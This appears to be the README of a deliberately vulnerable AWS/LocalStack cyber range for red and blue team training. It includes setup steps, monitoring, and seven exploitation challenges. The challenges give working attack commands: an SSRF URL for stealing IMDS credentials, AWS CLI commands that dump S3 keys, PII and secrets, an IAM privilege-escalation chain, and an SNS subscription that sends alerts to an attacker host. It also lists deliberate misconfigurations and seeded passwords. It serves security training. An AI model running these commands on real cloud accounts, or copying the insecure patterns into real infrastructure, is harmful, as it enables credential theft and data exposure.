# 🛡️ NSCS-Gate: Cloud Security Cyber Range

> An intentionally vulnerable cloud environment for hands-on red team / blue team security training, built around AWS service misconfigurations and common developer mistakes.

---

## 📋 Table of Contents

1. [Overview](#-overview)
2. [Architecture](#-architecture)
3. [Prerequisites](#-prerequisites)
4. [Installation & Setup](#-installation--setup)
   - [PC1 — Cloud Target (Host Machine)](#pc1--cloud-target-host-machine)
   - [PC2 — Security Monitor (SIEM)](#pc2--security-monitor-siem)
   - [PC3 — Attacker Machine](#pc3--attacker-machine)
5. [Services & Ports](#-services--ports)
6. [Toggling Vulnerability Mode](#-toggling-vulnerability-mode)
7. [Exploitation Challenges](#-exploitation-challenges)
8. [Monitoring & Detection](#-monitoring--detection)
9. [Cleanup & Reset](#-cleanup--reset)
10. [Vulnerability Reference](#-vulnerability-reference)
11. [Disclaimer](#-disclaimer)

---

## 🌐 Overview

**NSCS-Gate** simulates a real-world corporate cloud portal running on AWS services — with catastrophic architectural flaws baked in. Rather than focusing on traditional web vulnerabilities (XSS, SQLi), this lab is dedicated entirely to **Cloud Infrastructure Security**: IAM misconfigurations, SSRF to credential theft, public S3 buckets, Lambda information disclosure, and more.

The lab supports two operational modes, instantly switchable:

| Mode | Command | Description |
|------|---------|-------------|
| 🔴 **Vulnerable** (default) | `bash scripts/vulner.sh` | All intentional flaws active — red team mode |
| 🔒 **Hardened** | `bash scripts/fix.sh` | All vulnerabilities patched — blue team / remediation training |

---

## 🏗️ Architecture

The lab is designed as a **3-PC scenario** to simulate a realistic enterprise environment:

```
┌─────────────────────────────────────────────────────────────────┐
│                         LAN / VPN Network                        │
│                                                                  │
│  ┌──────────────────┐    logs     ┌──────────────────────────┐  │
│  │   PC1 — TARGET   │ ──────────▶ │   PC2 — SOC / MONITOR    │  │
│  │                  │             │                          │  │
│  │  LocalStack:4566 │             │  Wazuh Manager (SIEM)    │  │
│  │  VulnApp:8080    │             │  Wazuh Dashboard:443     │  │
│  │  Prometheus:9090 │             │  (receives agent events) │  │
│  │  Grafana:3000    │             └──────────────────────────┘  │
│  │  Wazuh Agent     │                                           │
│  └──────────────────┘                                           │
│          ▲                                                       │
│          │  attacks                                              │
│  ┌──────────────────┐                                           │
│  │  PC3 — ATTACKER  │                                           │
│  │                  │                                           │
│  │  Browser         │                                           │
│  │  AWS CLI         │                                           │
│  └──────────────────┘                                           │
└─────────────────────────────────────────────────────────────────┘
```

### Internal Docker Network (`cyberrange` bridge)

```
localstack-main (:4566)       ← Fake AWS (S3, IAM, Lambda, DynamoDB, etc.)
vulnerable-app  (:8080)       ← NSCS-Gate Flask web portal
metadata-service (:80)        ← Fake EC2 IMDS (credential theft target)
prometheus       (:9090)      ← Metrics collection
grafana          (:3000)      ← Dashboards
node-exporter    (:9100)      ← Host resource metrics
```

---

## 🔧 Prerequisites

### PC1 — Cloud Target (Windows or Linux)

| Tool | Version | Purpose |
|------|---------|---------|
| [Docker Desktop](https://www.docker.com/products/docker-desktop/) | ≥ 24.x | Runs all containers |
| [Docker Compose](https://docs.docker.com/compose/) | ≥ 2.x (bundled with Desktop) | Orchestrates the stack |
| [Terraform](https://developer.hashicorp.com/terraform/install) | ≥ 1.5 | Provisions AWS resources into LocalStack |
| [AWS CLI](https://aws.amazon.com/cli/) | ≥ 2.x | Interact with LocalStack from the host |

### PC2 — Monitor (Linux recommended)

| Tool | Version | Purpose |
|------|---------|---------|
| Docker & Docker Compose | ≥ 24.x | Runs Wazuh SIEM stack |
| Git | any | Clones the Wazuh Docker repo |

### PC3 — Attacker

| Tool | Purpose |
|------|---------|
| Web browser | Accesses NSCS-Gate web portal |
| AWS CLI ≥ 2.x | Executes cloud API calls using stolen credentials |
| `curl` / `httpie` | Optional — for raw HTTP exploit testing |

---

## 📦 Installation & Setup

> **Order matters:** Set up PC2 first so Wazuh is ready to receive log events before the agent on PC1 is installed.

---

### PC1 — Cloud Target (Host Machine)

#### Step 1 — Clone the Repository

```bash
git clone https://github.com/your-org/CyberRange.git
cd CyberRange
```

#### Step 2 — Configure AWS CLI for LocalStack

LocalStack accepts any dummy credentials. Configure the AWS CLI profile so commands work locally:

```bash
aws configure set aws_access_key_id     test
aws configure set aws_secret_access_key test
aws configure set region                us-east-1
aws configure set output                json
```

> 💡 All AWS CLI commands targeting LocalStack require `--endpoint-url http://localhost:4566`. You can create an alias:
> ```bash
> alias awslocal='aws --endpoint-url=http://localhost:4566'
> ```

#### Step 3 — Start the Docker Stack

```bash
# Builds the custom images (vulnerable-app, metadata-service) and starts all containers
docker compose up -d --build
```

Verify all containers are healthy:

```bash
docker compose ps
```

Expected output:

```
NAME               IMAGE                    STATUS
localstack-main    localstack/localstack    running (healthy)
vulnerable-app     cyberrange-vulnerable-app running
metadata-service   cyberrange-metadata-service running
prometheus         prom/prometheus           running
grafana            grafana/grafana           running
node-exporter      prom/node-exporter        running
```

> ⏳ **Wait 15–30 seconds** for LocalStack to fully initialize before running Terraform.

#### Step 4 — Deploy Cloud Infrastructure with Terraform

```bash
terraform init
terraform apply -auto-approve
```

This provisions ~40 AWS resources into LocalStack:
- S3 buckets (with seeded sensitive files)
- DynamoDB `users` table (with 5 seeded accounts)
- IAM users, roles, and policies (intentionally overprivileged)
- Lambda function (`vulnerable-api`)
- API Gateway (unauthenticated)
- SQS queues, SNS topics, Secrets Manager secrets, SSM parameters, KMS key

Successful apply output:

```
Apply complete! Resources: 40 added, 0 changed, 0 destroyed.

Outputs:
  api_endpoint       = "http://localhost:4566/restapis/.../prod/_user_request_/data"
  public_bucket      = "sensitive-data-bucket"
  vulnerable_app_url = "http://localhost:8080"
  ...
```

#### Step 5 — Install the Wazuh Agent (Security Monitoring)

Once PC2's Wazuh Manager is running, install the agent on PC1 to ship logs:

```bash
# Replace <PC2_IP> with the actual IP address of your monitoring machine
sudo bash scripts/wazuh_agent.sh <PC2_IP>
```

The script will:
1. Add the Wazuh APT repository (GPG-verified)
2. Install `wazuh-agent` pointed at your manager
3. Configure log monitoring for the `vulnerable-app` and `localstack` containers
4. Start and enable the agent systemd service

Verify the agent is running:

```bash
sudo systemctl status wazuh-agent
```

The agent should appear in the Wazuh Dashboard (`https://<PC2_IP>`) within a few minutes.

---

### PC2 — Security Monitor (SIEM)

> Run this **before** setting up PC1's agent.

#### Step 1 — Run the Manager Deployment Script

```bash
sudo bash scripts/wazuh_manager.sh
```

The script will:
1. Install Docker if not present (skips if already installed)
2. Clone the official Wazuh Docker repository (tag `v4.7.0`)
3. Generate TLS certificates for the Wazuh Indexer
4. Launch the full 3-container Wazuh stack via Docker Compose:
   - **Wazuh Manager** — processes and correlates events
   - **Wazuh Indexer** (OpenSearch) — stores all logs
   - **Wazuh Dashboard** — web UI at `https://<PC2_IP>`

> ⏳ **Wait 5–10 minutes** for the stack to fully initialize on first run.

#### Step 2 — Access the Dashboard

```
URL:      https://<PC2_IP>
Username: admin
Password: SecretPassword
```

> ⚠️ Accept the self-signed TLS certificate warning in your browser.

---

### PC3 — Attacker Machine

No server setup required. Just ensure the following are installed:

```bash
# Verify AWS CLI
aws --version

# Configure dummy creds pointing at PC1
aws configure set aws_access_key_id     attacker
aws configure set aws_secret_access_key attacker
aws configure set region                us-east-1
```

Access the target web portal:

```
http://<PC1_IP>:8080
```

---

## 🌐 Services & Ports

| Service | URL | Credentials | Notes |
|---------|-----|-------------|-------|
| **NSCS-Gate** (web portal) | `http://localhost:8080` | Register any account | Main attack surface |
| **LocalStack** (fake AWS) | `http://localhost:4566` | `test` / `test` | AWS API endpoint |
| **Grafana** | `http://localhost:3000` | `admin` / `admin` | Metrics dashboards |
| **Prometheus** | `http://localhost:9090` | None | Raw metrics |
| **Wazuh Dashboard** | `https://<PC2_IP>` | `admin` / `SecretPassword` | SIEM alerts |

### Pre-seeded DynamoDB Accounts (login to NSCS-Gate)

| Username | Password | Role |
|----------|----------|------|
| `admin` | `P@ssw0rd123!` | Administrator |
| `jsmith` | `Welcome1!` | Developer |
| `mjones` | `Summer2026!` | Analyst |
| `dbrown` | `Qwerty789` | Intern |

---

## 🔄 Toggling Vulnerability Mode

The two toggle scripts let you instantly switch the lab between fully vulnerable (red team) and fully hardened (blue team) states.

### Switch to Hardened Mode (Blue Team)

```bash
sudo bash scripts/fix.sh
```

Patches applied:
- 🔑 Cryptographically random session secret
- 🚫 SSRF blocklist (blocks `169.254.169.254`, internal IPs, container hostnames)
- 🙈 `/api/status` no longer exposes internal service topology
- 🔒 IDOR ownership check on file sharing
- 🔐 SHA-256 password hashing (register + login)
- 📦 Lambda: credentials from env vars, debug mode off, sanitized error responses
- ☁️ Cloud: S3 public policy → Deny, IAM wildcard → least-privilege, SQS/SNS restricted

> Automatically rebuilds the Docker container and updates seeded DynamoDB passwords.
> Run `terraform apply` to apply the cloud infra changes.

### Restore Vulnerabilities (Red Team)

```bash
sudo bash scripts/vulner.sh
```

Reverts every patch above to the original vulnerable state.

> ⚠️ Only run in an **isolated lab network**. Never on production systems.

---

## 🎯 Exploitation Challenges

### Challenge 1 — SSRF: Steal Cloud Credentials

**Difficulty:** 🟢 Easy

The `/webhooks/test` endpoint fetches any URL the user supplies — including internal services.

1. Register and log into NSCS-Gate at `http://<PC1_IP>:8080`
2. Navigate to **Webhooks**
3. Enter the IMDS credential URL:
   ```
   http://metadata-service/latest/meta-data/iam/security-credentials/vulnerable-role
   ```
4. Click **Test Connection** — the temporary AWS credentials appear in the response

---

### Challenge 2 — Overprivileged IAM: Full Cloud Takeover

**Difficulty:** 🟡 Medium

Use the stolen credentials from Challenge 1 to take control of the cloud environment.

```bash
export AWS_ACCESS_KEY_ID="<STOLEN_KEY>"
export AWS_SECRET_ACCESS_KEY="<STOLEN_SECRET>"
export AWS_SESSION_TOKEN="<STOLEN_TOKEN>"

# Enumerate all S3 buckets
aws --endpoint-url=http://<PC1_IP>:4566 s3 ls

# List all IAM users
aws --endpoint-url=http://<PC1_IP>:4566 iam list-users

# List all DynamoDB tables
aws --endpoint-url=http://<PC1_IP>:4566 dynamodb list-tables
```

---

### Challenge 3 — S3 Misconfiguration: Public Data Exposure

**Difficulty:** 🟢 Easy

The `sensitive-data-bucket` is publicly readable without authentication.

```bash
# List all files (no credentials required)
aws --endpoint-url=http://<PC1_IP>:4566 s3 ls s3://sensitive-data-bucket/ --recursive

# Download the production .env file
aws --endpoint-url=http://<PC1_IP>:4566 s3 cp s3://sensitive-data-bucket/.env .

# Download the SSH deploy key
aws --endpoint-url=http://<PC1_IP>:4566 s3 cp s3://sensitive-data-bucket/keys/deploy_key.pem .

# Download the leaked PII data
aws --endpoint-url=http://<PC1_IP>:4566 s3 cp s3://sensitive-data-bucket/exports/customer_pii.csv .
```

---

### Challenge 4 — Cloud Vault Exposure (SSM / Dashboard)

**Difficulty:** 🟢 Easy

The application prints secrets retrieved from AWS SSM Parameter Store directly onto the Dashboard page.

1. Log into NSCS-Gate
2. Navigate to **Dashboard**
3. Observe `DB_PASSWORD`, `stripe_key`, `jwt_secret` and other secrets in the config dump

Via AWS CLI (using stolen creds):
```bash
# List all SSM parameters
aws --endpoint-url=http://<PC1_IP>:4566 ssm describe-parameters

# Read the database connection string
aws --endpoint-url=http://<PC1_IP>:4566 ssm get-parameter \
    --name /prod/database/connection-string --with-decryption

# Dump all Secrets Manager secrets
aws --endpoint-url=http://<PC1_IP>:4566 secretsmanager list-secrets
aws --endpoint-url=http://<PC1_IP>:4566 secretsmanager get-secret-value \
    --secret-id prod/api/keys
```

---

### Challenge 5 — Serverless Info Disclosure (Lambda)

**Difficulty:** 🟢 Easy

The `vulnerable-api` Lambda function leaks its environment variables and hardcoded DB credentials when it crashes.

1. Navigate to **Serverless APIs**
2. Select **Get User Details**
3. Leave the **User ID** field empty and click **Invoke Lambda Function**
4. Observe the `DB_PASSWORD`, hardcoded `aws_key`, and full `environment` dict in the error response

---

### Challenge 6 — IAM Privilege Escalation Chain

**Difficulty:** 🔴 Hard

Follow the breadcrumbs to escalate from a low-privilege `intern-user` to full admin.

```bash
# Step 1: Start as the intern (get key from terraform output or /api/status)
export AWS_ACCESS_KEY_ID="<intern_access_key>"
export AWS_SECRET_ACCESS_KEY="test"

# Step 2: Discover breadcrumbs in S3
aws --endpoint-url=http://<PC1_IP>:4566 s3 cp \
    s3://sensitive-data-bucket/docs/internal_memo.md -

# Step 3: Use intern's secretsmanager access to steal dev-user keys
aws --endpoint-url=http://<PC1_IP>:4566 secretsmanager get-secret-value \
    --secret-id prod/iam/dev-user-keys

# Step 4: Switch to dev-user and assume the vulnerable-role
export AWS_ACCESS_KEY_ID="<dev_access_key>"
aws --endpoint-url=http://<PC1_IP>:4566 sts assume-role \
    --role-arn arn:aws:iam::000000000000:role/vulnerable-role \
    --role-session-name pwned

# Step 5: Use the assumed role credentials — full Admin access
```

---

### Challenge 7 — Open SQS/SNS (Message Injection)

**Difficulty:** 🟡 Medium

The SQS queue and SNS topic accept messages from any principal.

```bash
# Inject a fake job into the order processing queue
aws --endpoint-url=http://<PC1_IP>:4566 sqs send-message \
    --queue-url http://localhost:4566/000000000000/order-processing-queue \
    --message-body '{"task":"DELETE all orders","submitted_by":"attacker"}'

# Subscribe an external URL to the internal security-alerts SNS topic
aws --endpoint-url=http://<PC1_IP>:4566 sns subscribe \
    --topic-arn arn:aws:sns:us-east-1:000000000000:security-alerts \
    --protocol http \
    --notification-endpoint http://<ATTACKER_SERVER>/snitch
```

---

## 📊 Monitoring & Detection

### Grafana Dashboards (`http://localhost:3000`)

Pre-configured to show:
- LocalStack container CPU / memory
- HTTP request rates to the vulnerable app
- Host system resources (via Node Exporter)

Login: `admin` / `admin`

### Wazuh SIEM (`https://<PC2_IP>`)

The Wazuh agent on PC1 ships logs from:
- `vulnerable-app` Docker container (JSON format)
- `localstack-main` Docker container (JSON format)
- `metadata-service` Docker container (JSON format)
- LocalStack volume logs (`./volume/logs/*.log`)

Key alerts to watch for during red team exercises:
- Requests to `169.254.169.254` (IMDS credential theft)
- `s3:ListBucket` without credentials (public bucket enumeration)
- `secretsmanager:GetSecretValue` calls
- `sts:AssumeRole` lateral movement attempts
- Unexpected Lambda invocations with malformed payloads

---

## 🧹 Cleanup & Reset

### Quick Reset (Windows — PowerShell)

Tears down everything and re-deploys from scratch:

```powershell
.\scripts\reset.ps1
```

### Quick Reset (Linux / macOS)

```bash
bash scripts/reset.sh
```

What the reset script does:
1. `terraform destroy` — destroys all LocalStack resources
2. `docker compose down -v` — stops containers and removes volumes
3. Deletes `.terraform/`, `terraform.tfstate`, `lambda/handler.zip`
4. `docker compose up -d --build` — rebuilds and restarts everything
5. `terraform init && terraform apply` — re-provisions all cloud resources

### Manual Teardown

```bash
# Stop all containers
docker compose down -v

# Remove Terraform state
rm -rf .terraform terraform.tfstate terraform.tfstate.backup

# Remove compiled Lambda artifact
rm -f lambda/handler.zip
```

---

## 📚 Vulnerability Reference

| ID | Name | File | Severity | Challenge |
|----|------|------|----------|-----------|
| V1 | SSRF — IMDS Credential Theft | `app.py` `/webhooks/test` | 🔴 Critical | 1 |
| V2 | Overprivileged IAM Role (wildcard `*`) | `main.tf` | 🔴 Critical | 2 |
| V3 | Public S3 Bucket (PII, keys, DB dumps) | `main.tf` | 🔴 Critical | 3 |
| V4 | Sensitive config in SSM dumped to UI | `app.py` `/dashboard` | 🟠 High | 4 |
| V5 | Lambda hardcoded creds + debug error response | `lambda/handler.py` | 🟠 High | 5 |
| V6 | IAM privilege escalation chain | `main.tf` | 🔴 Critical | 6 |
| V7 | Open SQS/SNS — public message injection | `main.tf` | 🟡 Medium | 7 |
| V8 | IDOR — `/drive/share` fetches any S3 key | `app.py` | 🟠 High | — |
| V9 | Plaintext password storage in DynamoDB | `app.py` | 🟠 High | — |
| V10 | Weak static Flask session secret | `app.py` | 🟡 Medium | — |
| V11 | Info disclosure — `/api/status` leaks topology | `app.py` | 🟡 Medium | — |
| V12 | Cross-account confused deputy IAM role | `main.tf` | 🟠 High | — |
| V13 | Unauthenticated API Gateway → Lambda | `main.tf` | 🟠 High | — |
| V14 | KMS key with wildcard `Principal: *` policy | `main.tf` | 🟡 Medium | — |

---

## ⚠️ Disclaimer

This environment is **intentionally insecure**. It contains hardcoded credentials, public cloud resources, and deliberately exploitable code.

- ✅ **DO** run this in an isolated local lab or private network
- ✅ **DO** use it for authorized security training and education
- ❌ **DO NOT** expose any port to the public internet
- ❌ **DO NOT** deploy these patterns to real AWS accounts
- ❌ **DO NOT** use this on any machine you do not own

---

*Built for the NSCS CyberRange training program. 🛡️*
